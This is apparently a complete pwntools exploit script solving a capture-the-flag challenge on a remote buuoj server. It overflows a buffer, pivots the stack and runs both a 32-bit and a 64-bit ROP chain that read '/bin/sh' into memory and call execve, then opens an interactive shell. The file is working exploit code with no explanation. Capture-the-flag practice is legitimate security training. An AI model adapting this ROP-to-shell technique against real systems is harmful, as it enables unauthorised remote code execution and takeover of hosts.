from pwn import *

# context(os = 'linux', arch = 'i386', log_level = 'debug')
context(os = 'linux', log_level = 'debug')
# io = process('pwn')
io = remote('node4.buuoj.cn', 27984)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf32 = ELF('pwn')
elf64 = ELF('pwn2')

pop_eax_ret = 0x080a8af6
pop_edx_ecx_ebx_ret = 0x0806e9f1
int_0x80 = 0x080495a3
buf32 = 0x080da320
read32 = elf32.sym['read']
add_esp_0xc_ret = 0x080a8f69

pop_rax_ret = 0x43b97c
pop_rdi_ret = 0x4005f6
pop_rdx_rsi_ret = 0x43d9f9
syscall = 0x4011dc
buf64 = 0x6a32e0
read64 = elf64.sym['read']
add_rsp_0x38_ret = 0x461f85

payload32 = p32(read32) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(buf32) + p32(0x10)
payload32 += p32(pop_eax_ret) + p32(11) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(buf32) + p32(int_0x80)

payload64 = p64(pop_rdi_ret) + p64(0) + p64(pop_rdx_rsi_ret) + p64(0x10) + p64(buf64) + p64(read64)
payload64 += p64(pop_rax_ret) + p64(59) + p64(pop_rdi_ret) + p64(buf64) + p64(pop_rdx_rsi_ret) + p64(0) + p64(0) + p64(syscall)

payload = cyclic(0x110)
payload += p32(add_esp_0xc_ret) + p32(0)
payload += p64(add_rsp_0x38_ret)
payload += payload32
payload += b'\x00' * 8
payload += payload64

io.sendlineafter('We give you a little challenge, try to pwn it?\n', payload)
io.recv()
sleep(0.5)
io.send('/bin/sh\x00')
io.interactive()
